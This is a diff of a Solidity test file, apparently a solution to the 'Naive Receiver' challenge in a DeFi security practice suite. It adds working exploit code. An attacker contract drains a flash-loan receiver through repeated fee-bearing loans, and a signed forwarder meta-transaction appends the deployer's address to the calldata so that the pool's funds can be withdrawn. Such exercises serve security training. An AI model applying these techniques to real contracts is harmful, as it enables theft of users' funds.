@@ -77,7 +77,40 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Step 1
+        // Drain the naive receiver.
+        // It doesn't check where flash loan requests come from, and so will
+        // allow anyone to trigger flash loans and have it pay the fee.
+        new NaiveReceiverAttacker(pool, receiver);
+
+        // Step 2
+        // Call the forwarder, have it trigger a multicall, call the pool with
+        // the correct parameters for a withdrawal, but with a trailing 20
+        // bytes giving the address of the deployer, who holds all the funds,
+        // including the fees paid.
+        bytes[] memory call = new bytes[](1);
+        call[0] = abi.encodeWithSignature(
+                "withdraw(uint256,address)",
+                WETH_IN_POOL + WETH_IN_RECEIVER,
+                recovery
+            );
+        call[0] = abi.encodePacked(call[0], deployer);
+        BasicForwarder.Request memory request =  BasicForwarder.Request({
+                from: address(player),
+                target: address(pool),
+                value: 0 ether,
+                gas: 100000,
+                nonce: 0,
+                data: abi.encodeWithSignature("multicall(bytes[])", call),
+                deadline: block.timestamp + 1
+            });
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        forwarder.execute(request, abi.encodePacked(r, s, v));
     }
 
     /**
@@ -95,5 +128,14 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+}
+
+contract NaiveReceiverAttacker {
+
+    constructor(NaiveReceiverPool _pool, FlashLoanReceiver _receiver) {
+        for (uint256 i = 0; i < 10; i++) {
+            _pool.flashLoan(_receiver, address(_pool.weth()), 1, "");
+        }
     }
 }
